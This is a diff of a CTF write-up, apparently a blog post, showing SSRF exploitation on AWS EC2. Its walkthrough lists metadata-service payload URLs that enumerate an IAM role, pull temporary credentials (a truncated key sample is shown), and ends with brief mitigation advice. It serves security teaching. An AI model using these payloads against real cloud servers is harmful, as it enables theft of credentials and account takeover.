@@ -7,48 +7,43 @@ tags: [ctf, ssrf, aws, ec2, red-teaming]
 
 ## Introduction
 
-Server-Side Request Forgery (SSRF) is a critical vulnerability in cloud environments. In this write-up, I demonstrate how I exploited an SSRF vulnerability on an AWS EC2 instance to access the **Instance Metadata Service (IMDS)** and exfiltrate **IAM Security Credentials**.
+Server-Side Request Forgery (SSRF) is a critical vulnerability. In this write-up, I exploit an SSRF on AWS EC2 to access the **Instance Metadata Service**.
 
 ## Phase 1: Reconnaissance
 
-I identified a web application taking URL input. To test for SSRF, I injected the AWS "Magic IP":
+I found a URL input and tested it with the AWS Magic IP.
 
-```http
-[http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)
-Result: The server returned the metadata directory, confirming it is vulnerable and using IMDSv1.
+**Payload Used:**
+`http://169.254.169.254/latest/meta-data/`
 
-Phase 2: Exploitation
-1. Retrieving the Instance ID
-I queried the instance-id endpoint:
+The server responded with the directory listing, confirming **IMDSv1**.
 
-http://169.254.169.254/latest/meta-data/instance-id
+## Phase 2: Exploitation
 
-2. Stealing IAM Credentials (The Kill Chain)
-To escalate privileges, I enumerated the IAM role name:
+### 1. Get Instance ID
+I requested this URL:
+`http://169.254.169.254/latest/meta-data/instance-id`
 
-latest/meta-data/iam/security-credentials/
+### 2. Steal IAM Credentials
+I enumerated the role name first:
+`http://169.254.169.254/latest/meta-data/iam/security-credentials/`
 
-Result: The role name is ec2-prod-role.
+**Role Name:** `ec2-prod-role`
 
-Then, I constructed the final payload to steal the keys:
+Then I extracted the keys using this final payload:
 
-HTTP
-
+```text
 [http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role](http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role)
 Phase 3: Exfiltration
-The server responded with the temporary credentials:
+Response containing the keys:
 
-JSON
 
 {
   "Code" : "Success",
   "AccessKeyId" : "ASIAQ3EGUZ...",
-  "SecretAccessKey" : "EBvAKCmU...",
-  "Token" : "IQoJb3Jp..."
+  "SecretAccessKey" : "EBvAKCmU..."
 }
 Mitigation
-To prevent this attack, organizations should:
+Enforce IMDSv2.
 
-Enforce IMDSv2: This requires a session token and blocks simple SSRF.
-
-Input Validation: Implement a strict whitelist of allowed domains.
+Whitelist allowed domains.
